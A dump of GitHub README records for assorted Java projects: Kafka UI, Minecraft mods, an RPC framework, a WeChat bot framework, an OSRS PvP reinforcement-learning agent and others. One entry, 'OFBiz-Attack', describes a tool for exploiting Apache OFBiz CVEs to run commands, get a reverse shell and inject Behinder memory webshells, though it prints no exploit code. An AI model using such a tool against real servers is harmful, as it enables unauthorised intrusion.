    <a href=""https://www.producthunt.com/products/ui-for-apache-kafka/reviews/new"">ProductHunt</a>
</p>

<p align=""center"">
  <img src=""https://repobeats.axiom.co/api/embed/88d2bd9887380c7d86e2f986725d9af52ebad7f4.svg"" alt=""stats""/>
</p>

#### Kafbat UI is a free, open-source web UI to monitor and manage Apache Kafka clusters.

Kafbat UI is a simple tool that makes your data flows observable, helps find and troubleshoot issues faster and deliver optimal performance. Its lightweight dashboard makes it easy to track key metrics of your Kafka clusters - Brokers, Topics, Partitions, Production, and Consumption.

<i>
Kafbat UI, developed by <b>Kafbat</b>*, proudly carries forward the legacy of the UI Apache Kafka project.
Our dedication is reflected in the continuous evolution of the project, ensuring adherence to its foundational vision while adapting to meet modern demands.
We extend our gratitude to Provectus for their past support in groundbreaking work, which serves as a cornerstone for our ongoing innovation and dedication.

<b>*</b> - The <b>Kafbat</b> team comprises key contributors from the project's inception, bringing a wealth of experience and insight to this renewed endeavor.
</i>

# Interface

![Interface](https://raw.githubusercontent.com/kafbat/kafka-ui/images/overview.gif)

# Features
* **Multi-Cluster Management** — monitor and manage all your clusters in one place
* **Performance Monitoring with Metrics Dashboard** —  track key Kafka metrics with a lightweight dashboard
* **View Kafka Brokers** — view topic and partition assignments, controller status
* **View Kafka Topics** — view partition count, replication status, and custom configuration
* **View Consumer Groups** — view per-partition parked offsets, combined and per-partition lag
* **Browse Messages** — browse messages with JSON, plain text, and Avro encoding
* **Dynamic Topic Configuration** — create and configure new topics with dynamic configuration
* **Configurable Authentification** — [secure](https://ui.docs.kafbat.io/configuration/authentication) your installation with optional Github/Gitlab/Google OAuth 2.0
* **Custom serialization/deserialization plugins** - [use](https://ui.docs.kafbat.io/configuration/serialization-serde) a ready-to-go serde for your data like AWS Glue or Smile, or code your own!
* **Role based access control** - [manage permissions](https://ui.docs.kafbat.io/configuration/rbac-role-based-access-control) to access the UI with granular precision
* **Data masking** - [obfuscate](https://ui.docs.kafbat.io/configuration/data-masking) sensitive data in topic messages

## Feature overview

<details>
    <summary>Click here for the feature overview</summary>

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: Avro®, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

</details>

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Persistent installation

```
services:
  kafbat-ui:
    container_name: kafbat-ui
    image: ghcr.io/kafbat/kafka-ui:latest
    ports:
      - 8080:8080
    environment:
      DYNAMIC_CONFIG_ENABLED: 'true'
    volumes:
      - ~/kui/config.yml:/etc/kafkaui/dynamic_config.yaml
```

Please refer to our [configuration](https://ui.docs.kafbat.io/configuration/configuration-file) page to proceed with further app configuration.

## Some useful configuration related links

[Web UI Cluster Configuration Wizard](https://ui.docs.kafbat.io/configuration/configuration-wizard)

[Configuration file explanation](https://ui.docs.kafbat.io/configuration/configuration-file)

[Docker Compose examples](https://ui.docs.kafbat.io/configuration/compose-examples)

[Misc configuration properties](https://ui.docs.kafbat.io/configuration/misc-configuration-properties)

## Helm charts

[Quick start](https://ui.docs.kafbat.io/configuration/helm-charts/quick-start)

## Building from sources

[Quick start](https://ui.docs.kafbat.io/development/building/prerequisites) with building

## Liveliness and readiness probes
Liveliness and readiness endpoint is at `/actuator/health`.<br/>
Info endpoint (build info) is located at `/actuator/info`.

# Configuration options

All the environment variables/config properties could be found [here](https://ui.docs.kafbat.io/configuration/misc-configuration-properties).

# Contributing

Please refer to [contributing guide](https://ui.docs.kafbat.io/development/contributing), we'll guide you from there.

# Support

As we're fully independent, team members contribute in their free time.
Your support is crucial for us, if you wish to sponsor us, take a look [here](https://github.com/sponsors/kafbat) 
",1,137,51,Apache-2.0
mt1006/mc-ar-mod,FABRIC-1.20.1,"### This mod (especially in its current state) is more of a proof of concept than actual optimization mod!
It has many issues and greatly reduces performance of main rendering thread (even when disabled),
so for comparing performance use instance without mod installed.

# About
**Asynchronous Reprojection** is a Minecraft mod that creates second rendering context to asynchronously reproject frames from main rendering thread with new camera rotation and player position.

It was inspired by Comrade Stinger's demo, which was also base for shader code:
https://www.youtube.com/watch?v=VvFyOFacljg

Known issues:
- Fabric version works only on Windows and Linux (I haven't tested it on macos). Forge version works only on Windows.
- Screenshots (F2) and world icons don't work - they're black.
- Minor visual glitches.
- Camera bobbing is disabled.
- ""Fabulous"" graphics doesn't change anything compared to ""Fancy"".
- Camera sometimes rotates itself when opening or closing GUI.
- Forge version crashes when trying to resize window during startup.
- It sometimes just crashes (for no particular reason).

CurseForge page: https://www.curseforge.com/minecraft/mc-mods/asynchronous-reprojection

Modrinth page: https://modrinth.com/mod/asynchronous-reprojection

# Examples

![](https://raw.githubusercontent.com/mt1006/mc-ar-mod/_common/screenshots/example1.png)

![](https://raw.githubusercontent.com/mt1006/mc-ar-mod/_common/screenshots/example2.png)

![](https://raw.githubusercontent.com/mt1006/mc-ar-mod/_common/screenshots/example3.png)
",1,5,3,LGPL-3.0
vaginessa/NPatch,master,"# NPatch Framework

[![Build](https://img.shields.io/github/actions/workflow/status/HSSkyBoy/NPatch/main.yml?branch=master&logo=github&label=Build&event=push)](https://github.com/HSSkyBoy/NPatch/actions/workflows/main.yml?query=event%3Apush+is%3Acompleted+branch%3Amaster) [![Crowdin](https://img.shields.io/badge/Localization-Crowdin-blueviolet?logo=Crowdin)](https://lsposed.crowdin.com/lspatch) [![Download](https://img.shields.io/github/v/release/HSSkyBoy/NPatch?color=orange&logoColor=orange&label=Download&logo=DocuSign)](https://github.com/HSSkyBoy/NPatch/releases/latest) [![Total](https://shields.io/github/downloads/HSSkyBoy/NPatch/total?logo=Bookmeter&label=Counts&logoColor=yellow&color=yellow)](https://github.com/HSSkyBoy/NPatch/releases)

## 应用介绍 

无Root实现使用LSPosed框架，通过在目标APK中插入dex等来集成Xposed API。

## 支持版本

- 最低: Android 9
- 最高: 从理论上来讲，和 [LSPosed](https://github.com/LSPosed/LSPosed#supported-versions)的上限是一致的

## 下载方式

正式版本→请前往[Github releases page](https://github.com/HSSkyBoy/NPatch/releases)  
CI构建版本→请前往[Github Actions](https://github.com/HSSkyBoy/NPatch/actions)  
注意: debug版本只能在Github Actions中使用 

## Usage

+ Through jar
1. Download `lspatch.jar`
1. Run `java -jar lspatch.jar`

+ Through manager
1. Download and install `manager.apk` on an Android device
1. Follow the instructions of the manager app

## Translation Contributing

You can contribute translation [here](https://lsposed.crowdin.com/lspatch).

## Credits

- [LSPosed](https://github.com/LSPosed/LSPosed): Core framework
- [Xpatch](https://github.com/WindySha/Xpatch): Fork source
- [Apkzlib](https://android.googlesource.com/platform/tools/apkzlib): Repacking tool

## License

NPatch is licensed under the **GNU General Public License v3 (GPL-3)** (http://www.gnu.org/copyleft/gpl.html).
",0,0,1,GPL-3.0
Nexters/daily-phrase-server,develop,"![image](https://github.com/user-attachments/assets/52689cab-e2de-4429-931f-f787dd0ff607)

# 매일글귀<img src=""https://github.com/user-attachments/assets/08894d8a-7401-4959-86cd-c05888ba74c7"" align=left width=100>

> 수익형 글귀 공유 서비스, 매일글귀 • <b>백엔드</b> 리포지토리

<br/>

## 📁 System Architecture
<table>
  <tr>
    <td width=""100%"" style=""background-color: white;""><img src=""https://github.com/user-attachments/assets/c9fff9f7-136b-48c1-b4d4-82210c65d8d4""></td>
  </tr>
</table>
",0,2,95,
D0g3-8Bit/OFBiz-Attack,main,"# OFBiz-Attack
A Tool For CVE-2023-49070/CVE-2023-51467 Attack

### 测试环境

vulhub/ofbiz:18.12.09

### 使用

启动

````
java -jar OFBiz-Attack.jar
````

共有三个模块，分别是：

- 漏洞检测

  ![1](./img/1.png)

  仅输入目标URL即可，无限额外添加路由，否则影响后续模块利用。仅支持发送Https请求，运行速度取决于Web服务器性能

  验证完成后请勿修改URL，后续利用会从此框获取URL

- 命令执行

  使用前需完成漏洞校验，使用的是CVE-2023-51467来执行命令，也方便回显

  ![2](./img/2.png)

  

  执行失败会返回Not executed for security reason信息

  部分命令无法执行原因是（可能是因为）security.properties文件中设置了黑名单

  ![3](./img/3.png)

  但还是能执行到反弹shell，该模块体验不佳的话请移步下一个模块

- 注入内存马

  ⚠️慎用，伤害不可逆

  使用前需完成漏洞校验，使用CVE-2023-49070反序列化注入内存马，模块支持注入CMD/Behinder内存马，原则上只能注入一种

  ![4](./img/4.png)

  

  连接Behinder，默认密码，不要忘记最后的`/`

  ![5](./img/5.png)

  两种内存马都是注入到`/webtool/*`的Filter

### 结语

⚠️此工具仅用于学习交流，切勿用于非法用途

如果模块给你带来了不好的体验，在此深表歉意，还请为工具提出建议，后续进行改进🙏

感谢使用
",2,2,1,
2over/netty_rpc,main,"# 手写RPC框架的源代码
主要实现以下几个部分:IO通信、注册中心、以及服务的提供者和消费者、以及序列化/反序列、重连机制、粘包半包问题。
## 前言
需要设置JDK环境为1.8 否则可能会启动失败
## IO部分
1.BIO如何实现以及局限性

2.NIO是如何实现高性能的、以及Netty如何解决其中的Bug的

3.AIO(暂未实现，原因是Linux是基于NIO方式实现的伪异步，只有Windows系统实现了真正意义上的AIO)

4.粘包半包问题的解决方式(分隔符、定长、换行符、消息头+消息体)

5.序列化框架(Kryo)

6.Http/Https服务器实现

## 注册中心

1.Map结构实现

## 服务提供者
1.登录机制(支持白名单)

2.超时机制(如果客户端一直未发送数据给服务端，那么就会提示读取超时)

3.心跳机制
## 服务消费者
1.连接超时机制

2.断线重连机制

3.路由机制
## 代码部分
1.Netty版本

2.Java原生版本

## 其他疑惑请移步博客相关
https://blog.csdn.net/Cover_sky/article/details/136015162
",0,0,1,
brenoepics/at4j,main,"# Azure Translator for Java (AT4J)

[![Maven Central](https://img.shields.io/maven-central/v/io.github.brenoepics/at4j?color=blue)](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)
![Static Badge](https://img.shields.io/badge/azure--api-3.0-blue?style=flat&logo=microsoftazure&logoColor=%230080FF&color=%230080FF&link=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fazure%2Fai-services%2Ftranslator%2Freference%2Fv3-0-reference)
[![Static Badge](https://img.shields.io/badge/run-l?logo=postman&label=Postman&color=EF5B25)](https://www.postman.com/maintenance-astronaut-2993290/workspace/brenoepics/collection/18589822-dfe7a640-9b94-47a8-b19f-46cb9cc8843e?action=share&creator=18589822)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=coverage)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)

An unofficial Java library for translating text using Azure AI Cognitive Services.

## ✨ Features

- Text Translation: Translate text from one language (or detect) to another or to a list of languages.
- Language Detection: Detect the language of a given text.
- Profanity Handling: Options for handling profanity in translations.
- Text Type Support: We support both plain text and HTML text translation.
- And more.

## 📝 Documentation

- [AT4J Docs](https://brenoepics.github.io/at4j/)
- [JavaDoc](https://brenoepics.github.io/at4j/javadoc/)

## 🎉 Basic Usage

> [!NOTE]
> Example repository [Azure-Translator-Example](https://github.com/brenoepics/Azure-Translator-Example)

The following example translates a simple Hello World to Portuguese, Spanish and French.

```java
public class ExampleTranslator {
  public static void main(String[] args) {
    // Insert your Azure key and region here
    String azureKey = ""<Your Azure Subscription Key>"";
    String azureRegion = ""<Your Azure Subscription Region>"";
    AzureApi api = new AzureApiBuilder().setKey(azureKey).region(azureRegion).build();

    // Set up translation parameters
    List < String > targetLanguages = List.of(""pt"", ""es"", ""fr"");
    TranslateParams params =
            new TranslateParams(""Hello World!"", targetLanguages).setSourceLanguage(""en"");

    // Translate the text
    Optional < TranslationResponse > translationResult = api.translate(params).join();

    // Print the translations
    translationResult.ifPresent(
            response ->
                    response.getFirstResult().getTranslations().forEach(ExampleTranslator::logLanguage));
  }

  public static void logLanguage(Translation translation) {
    System.out.println(translation.getLanguageCode() + "": "" + translation.getText());
  }
}
```

<details>
     <summary>Expected Output</summary>

```console
pt: Olá, Mundo!
es: ¡Hola mundo!
fr: Salut tout le monde!
```

</details>

## 📦 Download / Installation

The recommended way to get AT4J is to use a build manager, like Gradle or Maven.

### [AT4J Dependency](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)

<details>
  <summary>Gradle</summary>

```gradle
implementation group: 'io.github.brenoepics', name: 'at4j', version: '1.2.0'
```

</details>
<details>
  <summary>Maven</summary>

```xml

<dependency>
    <groupId>io.github.brenoepics</groupId>
    <artifactId>at4j</artifactId>
    <version>1.2.0</version>
</dependency>
```

</details>
<details>
  <summary>Sbt</summary>

```sbt
libraryDependencies += ""io.github.brenoepics"" % ""at4j"" % ""1.2.0""
```

</details>

### Frequently Asked Questions (FAQ)

**Q:** How do I access Azure Translator Keys for my project?

**A:** You can access your Azure Translator Keys through your Azure portal. Remember to keep your keys secure and
refrain from sharing them publicly. If you suspect a key has been compromised, it's crucial to regenerate it promptly.
For detailed instructions on generating your own keys, refer
to [this guide](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-subscription). Additionally, you
can explore the [Azure Free Tier](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-free-tier) for
more information.

## 🤝 Thank You!

- **Microsoft Azure**: Supporting our project with a generous grant of $10,000+ in Azure credits, enabling us to use
  virtual machines, document translation and other essential cloud resources for our development needs.
- We extend our sincere thanks to all contributors for their invaluable contributions.

## 🧑‍💻 Contributing

Contributions of any kind are welcome. You can start contributing to this library by creating issues, submitting pull
requests or giving a star to the project.

## 📃 License

AT4J is distributed under the [Apache license version 2.0](./LICENSE).
",4,2,8,Apache-2.0
SMGCommunity/Whitehole-Neo,master,"# Whitehole Neo
![Editing Flip-Swap Galaxy](https://github.com/SMGCommunity/Whitehole-Neo/blob/master/ExampleImage.png)
**Whitehole Neo** is a rewrite of *Whitehole*, a level editor for *Super Mario Galaxy* and *Super Mario Galaxy 2* that is over 10 years old.
This goal with this version is to make the program more stable and to be properly maintained.
It removes a lot of unused code and broken features that were introduced between versions 1.4 through 1.7, and improves on Despaghettification.
Several outdated or questionable parts of the code have been upgraded, but there's still a lot more waiting to be improved.
Major new additions include support for the [new object database](https://github.com/SMGCommunity/galaxydatabase), simple galaxy names that are displayed on the main window, a completely new Light Mode and Dark Mode UI, The ability to Undo actions, and Copy & Paste for objects.
It is also fully compatible with all of SMG1's stages. Tons of bugs introduced in older versions of Whitehole have been fixed as well.

This is intended for Java 11, though the program runs fine on newer Java versions as well, but requires the tool to be started using this command: ```java --add-exports=java.desktop/sun.awt=ALL-UNNAMED -jar Whitehole.jar```.<br/>Alternatively, run the included `.bat` file

## Controls
- Left Click: Select/Deselect object (hold Shift/Ctrl to select multiple)
- Left Click Drag: Pan camera, Move object
- Right Click Drag: Rotate camera
- Scroll Wheel: Move camera forward/backward, Move object forward/backward
- Ctrl+C: Copy selected objects
- Ctrl+V: Paste selected objects (positioned at the mouse)
- Ctrl+Z: Undo previous action
- Shift+A: Add object quick access menu
- Spacebar: Jump camera to selected object
- H: Hide/Unhide selected objects
- Alt+H: Unhide All hidden objects
- Delete: Delete selected objects
- Arrow Keys + PageUp/PageDown: (Can switch to WASD + EQ in the settings)
  - Hold P to move selected objects
  - Hold R to rotate selected objects
  - Hold S to scale selected objects

## Libraries
- **jogamp**: https://jogamp.org/
- **gluegen**: https://jogamp.org/gluegen/www/
- **org.json**: https://github.com/stleary/JSON-java
- **flatlaf**: https://github.com/JFormDesigner/FlatLaf
- **JWindowsFileDialog**: https://github.com/JacksonBrienen/JWindowsFileDialog
",8,22,1,
daylanbueno/auth-api,main,"
🚀 Shared my insights in the latest video! Explored efficient implementation of authentication 
and authorization in Spring applications using Spring Security and JWT. Learn how to enhance the
security of your applications effortlessly, with valuable insights and hands-on demonstrations.
This content aims to contribute to the community by providing tips, best practices, and robust strategies for secure development.
Let's grow together! Watch the video and level up your skills.
🤝💻 #SoftwareDevelopment #SpringSecurity #JWT #SharingKnowledge #TechCommunity #DigitalSecurity

## Tecnologies
- Java 17
- Spring boot
- Spring security
- Maven
- Lombok

  Youbube video: https://www.youtube.com/watch?v=aN1R_ilr0qA
",0,0,2,
MU-CS3330/SP2024-class-codes,main,# SP2024-class-codes,0,0,1,
XiYang6666/YSM-Decoder,master,"# YSM-Decoder

解码ysm文件的Java CLI工具

> [!IMPORTANT]  
> 该工具仅用于学习, 请勿滥用.

## 注意

由于部分使用者贴脸开大的原因, 本项目将不再维护.

## 支持版本

仅支持 Yes Steve Model 1.2.0 以下加密版本为 1 或 2 的 ysm 文件的解码.

## 使用

```bash
java -jar YSM-Decoder-<version>.jar -i <input_file_path> -o <output_dir_path>
```
",2,0,1,MIT
Fernanda-Kipper/desafio-anotaai-backend,main,"# Restaurant Marketplace
## AnotaAi Backend Challenge

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring](https://img.shields.io/badge/spring-%236DB33F.svg?style=for-the-badge&logo=spring&logoColor=white)
[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
![MongoDB](https://img.shields.io/badge/MongoDB-%234ea94b.svg?style=for-the-badge&logo=mongodb&logoColor=white)
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)

This project is an API built using **Java, Java Spring, AWS Simple Queue Service, Mongo DB and AWS Simple Storage Service.**

The Microservice was developed for my [Youtube Channel](https://youtu.be/a3tPHH8uwPc?si=vFf-S2H5i3IpVTjN), to demonstrate how to solve the [AnotaAi Backend Challenge](https://github.com/githubanotaai/new-test-backend-nodejs).

## Table of Contents

- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Database](#database)
- [Contributing](#contributing)

## Installation

1. Clone the repository:

```bash
git clone https://github.com/Fernanda-Kipper/desafio-anotaai-backend.git
```

2. Install dependencies with Maven

3. Create a configuration with your runtime environment variables with your AWS Credentials that are used in `application.properties`

```yaml
aws.region=us-east-1
aws.accessKeyId=${AWS_KEY_ID}
aws.secretKey=${AWS_SECRET}
```

**Config Values**

```yaml
AWS_KEY_ID=VALUE;AWS_SECRET=VALUE2
```

**Mongo**

1. Run in terminal:
```bash
docker compose up -d
```

2. Create a DB for mongo using mongo express: http://localhost:8081.

3. Log with admin:pass and create a database called 'product-catalog'.

## Usage

1. Start the application with Maven
2. The API will be accessible at http://localhost:8080

## API Endpoints
The API provides the following endpoints:

**API PRODUCT**
```markdown
POST /api/product - Create a new product
GET /api/product - Retrieve all products
PUT /api/product/{id} - Updates a product
DELETE /api/product/{id} - Delete a product
```

**BODY**
```json
{
  ""title"": ""Produto para postar no tópico"",
  ""description"": """",
  ""ownerId"": ""4444444"",
  ""categoryId"": ""659d558b0304df732ddd4587"",
  ""price"": 10000
}
```

**API CATEGORY**
```markdown
POST /api/category - Create a new category
GET /api/category - Retrieve all categories
PUT /api/category/{id} - Updates a category
DELETE /api/category/{id} - Delete a category
```

**BODY**
```json
{
  ""id"": ""393948882828"",
  ""title"": ""Teste"",
  ""description"": """",
  ""ownerId"": ""4444444""
}
```

## Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, please open an issue or submit a pull request to the repository.

When contributing to this project, please follow the existing code style, [commit conventions](https://www.conventionalcommits.org/en/v1.0.0/), and submit your changes in a separate branch.




",0,0,2,
meteorOSS/wechat-bc,master,"
> 我是一名即将毕业的应届生，对计算机和Java后端开发充满热情。
> 现在正在寻找实习工作，如果有符合的岗位招聘，希望能考虑一下我! 微信 zhengsenhe0758

# WeChatBc

> 类似开发公众号一样，开发个人微信号

采用了类似Bukkit的插件化框架设计，基于wechatbc独立且呼吸顺畅的开发扩展模块 ⭐

![image](https://github.com/meteorOSS/WeChatBc/assets/61687266/86f34b62-5f5b-4a3d-a3cc-cc151606b495)

![image](https://github.com/meteorOSS/WeChatBc/assets/61687266/dc4bce02-e5c2-416f-9f90-312f1004b9b0)

(图片效果需安装 [WeChatSetu插件](https://github.com/meteorOSS/WeChatSetu) )

![image](https://github.com/meteorOSS/wechat-bc/assets/61687266/a5cde024-318d-4c04-b87b-7f56bc7fafa3)

## 支持功能

* 消息回复(好友，群组),文本,视频,文件,语音发送
* 获取用户信息，设置备注，添加好友....
* API简单易用。使用java编写扩展插件，打包以jar载入运行 详见 [编写wechatbc插件](https://github.com/meteorOSS/WeChatBc/wiki/%E7%BC%96%E5%86%99WeChatBc%E6%8F%92%E4%BB%B6)
* 文档 [WeChatBc-WIKI](https://github.com/meteorOSS/WeChatBc/wiki)

## 插件资源

[📌 WeChatSetu: 让机器人随机发送""小姐姐跳舞视频"";爬取pixiv图片](https://github.com/meteorOSS/WeChatSetu)

[📌 chatgpt: 接入chatgpt](https://github.com/meteorOSS/wechat-gpt)

[📌 revoke-listener: 防消息撤回](https://github.com/meteorOSS/revoke-listener)

[📌 wechat-pay: 收款码收款回调](https://github.com/meteorOSS/wechat-pay)

你可以在 https://github.com/meteorOSS/wechat-bc/issues/28 分享你编写的插件，我会把它们更新到这里

## 安装

详见 [启动WeChatBc](https://github.com/meteorOSS/WeChatBc/wiki/%E5%90%AF%E5%8A%A8WeChatBc)

## Thanks

> **[Bukkit框架](https://github.com/Bukkit/Bukkit)** 事件分发，插件管理等模式深受该项目影响

> **[Jkook](https://github.com/SNWCreations/JKook)** 最初是因为该项目萌生了用java写一个微信客户端实现的想法

> **[itchat](https://github.com/littlecodersh/itchat)** 调试微信接口时参考的项目，感谢前辈的付出


如今微信在当代社交生活中已然成为不可或缺的一环。本项目最初诞生于一个简单的愿景：

通过个人微信号，将用户与智能家居设备、快递查询服务以及日常事务通知等功能紧密连接。

目标不仅仅是简化操作流程，而是在于打造一个更加高效、便捷的生活方式

如果这一切能够为你的生活带来哪怕是微小的便捷与改变，对我而言，便是莫大的荣誉和满足

## 贡献

欢迎fork后提交pr，冲突解决需要花费很多时间，请在同步源仓库最新代码后进行提交


## ⭐使用中的任何问题欢迎提交issue或加入Q群653440235反馈

本项目仅供学习使用，一切使用本项目造成的后果，开发者概不负责

[![wechatbc](https://api.star-history.com/svg?repos=meteorOSS/wechat-bc&type=Date)](https://star-history.com/#meteorOSS/wechat-bc&Date)




















",20,12,7,MIT
ArtformGames/BungeeAuthProxy,master,"```text
   ___                         ___       __  __   ___                   
  / _ )__ _____  ___ ____ ___ / _ |__ __/ /_/ /  / _ \_______ __ ____ __
 / _  / // / _ \/ _ `/ -_) -_) __ / // / __/ _ \/ ___/ __/ _ \\ \ / // /
/____/\_,_/_//_/\_, /\__/\__/_/ |_\_,_/\__/_//_/_/  /_/  \___/_\_\\_, / 
               /___/                                             /___/  
```

README LANGUAGES [ [**English**](README.md) | [中文](README_CN.md)  ]

![CodeSize](https://img.shields.io/github/languages/code-size/ArtformGames/BungeeAuthProxy)
[![Download](https://img.shields.io/github/downloads/ArtformGames/BungeeAuthProxy/total)](https://github.com/ArtformGames/BungeeAuthProxy/releases)
[![Java CI with Maven](https://github.com/ArtformGames/BungeeAuthProxy/actions/workflows/maven.yml/badge.svg?branch=master)](https://github.com/ArtformGames//actions/workflows/maven.yml)
![Support](https://img.shields.io/badge/Minecraft-Java%201.16--Latest-green)

# **BungeeAuthProxy**

Authentication proxy injector for BungeeCord servers,
which is trying to solve the problem of inability to access the MineCraft online session and auth service in some areas.

## Usage

**Before using this injector, make sure that your Java version is 11 or above.**

1. Download latest release from [here](https://github.com/ArtformGames/BungeeAuthProxy/releases) .
2. Put the jar file into the folder of your BungeeCord server (same path with server jar).
3. Add the `-javaagent:BungeeAuthProxy.jar[=<CONFIG-FILE-NAME>]` before `-jar <server-jar>.jar` to the start command of
   your BungeeCord server.
    - For example: `java -javaagent:BungeeAuthProxy.jar -jar BungeeCord.jar`
    - Using custom config file name: `java -javaagent:BungeeAuthProxy.jar=auth-proxy.yml -jar BungeeCord.jar`
4. Start your bungeecord server, and configured the proxy (Default is `auth.yml` in server folder).

## Configurations

Will be generated on the first boot up.

```yaml
debug: false

# MineCraft service settings
service:
  # Timeout duration for single request in milliseconds.
  time-out: 5000
  # Authentication url dns-cache expire duration in milliseconds
  # If this value ≤0, will disable dns-cache.
  dns-cache-expire: 60000

# Proxy server settings
proxy:
  # Proxy protocol, -1 = NO_PROXY ,0 = HTTP/HTTPS, 1 = SOCKS4, 2 = SOCKS5
  protocol: -1
  # Proxy host
  host: 127.0.0.1
  # Proxy port
  port: 7890
  # Proxy authentication settings
  auth:
    # Whether to enable proxy authentication
    enabled: false
    username: proxy-username
    password: proxy-password

advance:
   # Remove unused field after injection.
   # If any 'NoSuchFieldException' or 'IllegalAccessException' occurred, try to set this to false.
   remove-unused-field: true
```

## Open Source Licence

The source code of this project adopts the [GNU General Public License v3.0](https://opensource.org/licenses/GPL-3.0).

## Supports

This project is mainly developed by the [Artfrom Games](https://github.com/ArtformGames/) .

Many thanks to Jetbrains for kindly providing a license for us to work on this and other open-source projects.  
[![](https://resources.jetbrains.com/storage/products/company/brand/logos/jb_beam.svg)](https://www.jetbrains.com/?from=https://github.com/ArtformGames/BungeeAuthProxy)

",5,0,1,GPL-3.0
Naton1/osrs-pvp-reinforcement-learning,master,"# OSRS PvP Reinforcement Learning

This project leverages deep reinforcement learning, specifically [PPO](https://arxiv.org/pdf/1707.06347.pdf), and
self-play techniques to develop an AI agent capable of mastering 'no honor' player versus player fights
in [Old School RuneScape (OSRS)](https://oldschool.runescape.com/) (such as in Last Man Standing).

**Project Components:**

1. [ML Training System](#pvp-ml)
2. [Game Simulation](#simulation-rsps)

The training system launches and manages the simulation when training, though the simulation can be run on its own too.
The training system also contains an API to serve trained models.

**Note**: A third component for evaluating the models in the live game as a third-party client plugin was developed but
is not publicly available to prevent affecting the real game.

### Showcase

The most recent model version shows incredibly promising results. [FineTunedNh](pvp-ml/models) maintained a
near perfect win rate on the real game in LMS, primarily losing only due to the inherent randomness of the game.

#### Youtube Video

https://youtu.be/jArLZ8nC5Nw

[<img width=400 src=""./assets/youtube-thumbnail.png"">](https://youtu.be/jArLZ8nC5Nw)

Evaluation session stats:\
![LMS Session](assets/pvp-plugin.png)

Evaluation footage:\
![Fight Clip](assets/clipped-ags-kill.gif)

<details>
  <summary>View Additional Screenshots</summary>

* Win rate against scripted baseline throughout training
  ![Eval Win Rate](assets/train-eval-percent.png)

* LMS! (note: this account was used for testing/data collection too, the final trained model has ~99% win rate)
  ![LMS Stats](assets/lms-ingame-stats.png)

* First to 10k+ PvP Arena rank, and reached #1
  ![#1 Highscores](assets/pvp-arena-highscores.png)

* In-game PvP Arena rank (the game really says this)
  ![10k+ Rank](assets/pvp-area-ingame-rank.png)

</details>

# How To Use

1. Clone the repository: `git clone https://github.com/Naton1/osrs-pvp-reinforcement-learning`.
2. Follow the README in each of the two subprojects to set up each project individually.

By following these steps, you'll be able to set up the environment and start training your own AI agent. You'll also
be able to serve the pre-trained models via an API.

## [PvP ML](pvp-ml)

This Python-based component encompasses the core machine learning system. It's the primary interface for training,
orchestrating the entire training workflow, and facilitating connections to the simulation RSPS for training
sessions. The system also includes a socket-based API for real-time predictions.

## [Simulation RSPS](simulation-rsps)

The Simulation RSPS project provides a platform for conducting simulated PvP fights, enhancing the training efficiency
of the agent. It's built on top of a pre-existing private server: [Elvarg RSPS](https://github.com/RSPSApp/elvarg-rsps).

### [Environment Contracts](contracts)

Environment contracts are defined in [contracts/environments](contracts/environments), using JSON files that
describe the actions and observations within each environment. These contracts are used by the two components listed
above.

#### Existing Environment Contracts

* [NH Environment](contracts/environments/NhEnv.json): The primary environment for this project
* [Dharok Edge-Style Environment](contracts/environments/DharokEnv.json): A test environment, partially implemented.

## Train Custom Model

You can train a customized model on the simulation for any defined environment. To train on a new environment, you
can add one ([see below](#add-new-environment)).

Experiment parameters are defined in a YAML file. There are several provided configurations. These configurations
can be customized to produce train new and unique models.

See [start a training job](pvp-ml/README.md#start-training-job) for more detailed
information.

### Add New Environment

You can define a new environment in addition to the pre-existing environments. Use the already-implemented environments
as a reference.

1) Implement the environment contract at [contracts/environments](contracts/environments).
2) Follow the [simulation steps to add a new environment](simulation-rsps/README.md#add-new-environment).
3) Create or update [a training configuration](pvp-ml/config) to use the new environment by setting `env-name`.

## Use Existing Models

To use an existing model via API:

1. Set up the [pvp-ml project](pvp-ml/README.md#how-to-use).
2. Run the [pvp-ml API](pvp-ml/README.md#serve-models-via-api).

## Evaluate Trained Models

To play against the trained models on the simulation:

1. Set up the [pvp-ml project](pvp-ml/README.md#how-to-use).
2. Set up the [simulation-rsps](simulation-rsps/README.md#how-to-use) project and start the server.
